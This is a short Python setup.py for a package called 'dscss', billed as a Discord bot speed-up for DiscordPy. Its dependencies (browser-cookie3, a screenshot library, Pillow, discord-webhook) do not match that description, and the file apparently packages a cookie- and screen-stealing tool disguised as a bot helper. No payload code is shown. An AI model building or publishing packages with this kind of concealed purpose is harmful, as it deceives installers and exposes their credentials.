from setuptools import setup, find_packages

setup(
    name="dscss",
    version="1.0.0",
    packages=find_packages(),
    install_requires=[
        'requests',
        'discord-webhook',
        'browser-cookie3',
        'screenshot',
        'Pillow'
    ],
    author="SDev",
    description="Discord Bot SuperSpeed for DiscordPy",
    url="https://anycorp.dev",
    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)